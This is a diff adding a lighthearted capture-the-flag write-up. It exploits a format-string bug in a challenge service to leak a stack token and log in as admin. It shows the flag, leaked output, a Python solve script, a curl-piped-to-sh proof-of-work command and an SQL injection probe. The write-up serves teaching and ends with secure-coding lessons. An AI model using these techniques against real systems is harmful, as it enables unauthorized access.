@@ -1,0 +1,212 @@
+================================================================================
+                    KRAMPUS SYNDICATE'S FAILED EXFIL SERVICE
+                         or: How I Learned to Stop Worrying 
+                            and Love Format Strings
+================================================================================
+
+Challenge: Day 7 - The Collector
+Target: nc ctf.csd.lol 7777
+Flag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}
+
+================================================================================
+                              THE SETUP
+================================================================================
+
+So apparently KRAMPUS Syndicate (very festive, very evil) set up a data 
+exfiltration endpoint. Some guy named "vipin" shared a binary on his sketchy 
+file hosting site that's now... dead. Cool. Thanks vipin. Very helpful.
+
+The Telegram chat was basically:
+  TorTannenbaum: "yo these npld boxes are easy to hack lmao"
+  Someone: "how??"
+  TorTannenbaum: "just decomp it bru it aint that deep"
+  
+Narrator: It was, in fact, that deep. At least without the binary.
+
+================================================================================
+                           STEP 1: WHAT IS THIS THING?
+================================================================================
+
+Connected to the server. Got hit with a proof-of-work challenge first because
+apparently hackers need to prove they're serious before hacking. Fair enough.
+
+  $ curl -sSfL https://pwn.red/pow | sh -s <challenge_string>
+
+After that, got a prompt:
+  cmd: 
+
+Okay cool, it takes commands. Let's see what we got:
+
+  read   -> Shows whatever is in the "data buffer" (initially empty)
+  write  -> Lets you write stuff to the buffer  
+  admin  -> Asks for password (auth:), then says "denied" because life is pain
+  flag   -> Says "auth: denied" without even asking. Rude.
+  
+Everything else just returns "?" like I'm the idiot here.
+
+================================================================================
+                    STEP 2: TRYING LITERALLY EVERYTHING
+================================================================================
+
+Okay so I need to authenticate. Let me just try some passwords:
+  - admin/admin? denied
+  - password? denied  
+  - krampus? denied
+  - KRAMPUS? denied (maybe it's case sensitive idk)
+  - 123456? denied
+  - hunter2? denied (classic)
+  - [empty]? denied
+  - root? denied
+  
+Cool. Cool cool cool. This is fine.
+
+Let me try some big brain moves:
+  - SQL injection? "' OR 1=1--" -> denied
+  - Buffer overflow? "A"*1000 -> denied (and it crashed kinda?)
+  - NULL bytes? -> denied
+  - Format strings in password? -> denied
+
+Wait... format strings...
+
+================================================================================
+                    STEP 3: THE "OH SNAP" MOMENT
+================================================================================
+
+What if I try format strings in the WRITE command instead?
+
+  cmd: write
+  data: %p
+  ok
+  cmd: read
+  data:
+  0x7f3d0f2fa643
+  cmd:
+
+YOOOOOOO IT'S PRINTING STACK MEMORY
+
+The write command has a format string vulnerability! When I write "%p", 
+instead of storing the literal text "%p", it interprets it as a format 
+specifier and leaks memory addresses!
+
+This is like leaving your diary open on the kitchen table and being surprised
+when your roommate reads it. Classic developer move.
+
+================================================================================
+                      STEP 4: DUMPING THE STACK
+================================================================================
+
+Time to leak EVERYTHING. Used %N$p to read specific stack positions:
+
+  %1$p  -> 0x79c064505643       (some libc address)
+  %3$p  -> 0x79c06441d5a4       (another address)  
+  %4$p  -> 0x5                  (interesting...)
+  %8$p  -> 0xa64616572          (wait this spells "read" backwards lol)
+  %13$p -> 0x6a530f57bd98ab78   (THIS LOOKS DIFFERENT)
+  %21$p -> 0xb2912038825f667d   (also weird)
+
+Most values look like memory addresses (start with 0x7f for libc, etc.)
+But positions 13 and 21 look like... random data? Suspicious.
+
+================================================================================
+                      STEP 5: THE HINT THAT SAVED ME
+================================================================================
+
+Got a hint: "The secret code sits inside those eight bytes, just not in the 
+position you might expect. Try isolating the upper four bytes..."
+
+*slaps forehead*
+
+The 8-byte value at position 13: 0x6a530f57bd98ab78
+                                   ^^^^^^^^ ^^^^^^^^
+                                   upper 4   lower 4
+
+Upper 4 bytes: 0x6a530f57 = 1783828311 in decimal
+Lower 4 bytes: 0xbd98ab78 = 3180899192 in decimal
+
+The PASSWORD is the upper 4 bytes converted to decimal!
+
+================================================================================
+                      STEP 6: VICTORY LAP
+================================================================================
+
+  cmd: write
+  data: %13$p
+  ok
+  cmd: read
+  data:
+  0x6a530f57bd98ab78
+  cmd: admin
+  auth: 1783828311
+  
+  # KRAMPUS SYNDICATE EXFIL v1.4
+  node_id: krps-ops-node12
+  channel: steady
+  auth_token: a94f210033bb91ef2201df009ab1
+  rotation_tag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}
+  last_sync: 2025-11-29T02:11Z
+  checksum: 4be2f1aa
+
+GET REKT KRAMPUS
+
+================================================================================
+                           WHY THIS WORKED
+================================================================================
+
+1. The server stores a random auth token on the stack
+2. The write function uses printf() without format validation (bad bad bad)
+3. We can leak stack memory using format specifiers
+4. The token is at stack position 13, stored in the upper 4 bytes
+5. Server compares our password input against this value as a decimal integer
+
+The flag literally says: "Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92"
+
+Translation: "KRAMPUS NEEDS TO LEARN TO CHECK COMPILER WARNINGS"
+
+When you compile C code with printf(user_input) instead of printf("%s", user_input),
+the compiler SCREAMS at you with warnings. KRAMPUS ignored them. Don't be KRAMPUS.
+
+================================================================================
+                           LESSONS LEARNED
+================================================================================
+
+1. Always check compiler warnings (especially -Wformat-security)
+2. Format string vulnerabilities are still alive and well in 2025
+3. Never use printf(user_input), always printf("%s", user_input)
+4. If your auth token is on the stack, maybe encrypt it or something idk
+5. The guy who said "just decomp it bru" was lowkey right, the vuln was simple
+
+================================================================================
+                              FINAL SOLVE SCRIPT
+================================================================================
+
+  import socket
+  
+  # [connect and solve PoW]
+  
+  sock.send(b'write\n')
+  sock.recv(4096)
+  sock.send(b'%13$p\n')      # Leak stack position 13
+  sock.recv(4096)
+  sock.send(b'read\n')
+  response = sock.recv(4096)  # Get something like 0x6a530f57bd98ab78
+  
+  # Extract upper 4 bytes
+  hex_val = response.split()[0][2:].zfill(16)
+  password = int(hex_val[:8], 16)  # Upper 4 bytes as decimal
+  
+  sock.send(b'admin\n')
+  sock.recv(4096)
+  sock.send(f'{password}\n'.encode())
+  print(sock.recv(4096))  # FLAG!
+
+================================================================================
+                                 GG EZ
+================================================================================
+
+Time spent: Way too long before realizing format strings existed
+Coffee consumed: Yes
+Sanity remaining: Questionable
+
+Thanks for the challenge! Merry KRAMPUS! 🎄👹
+
+================================================================================
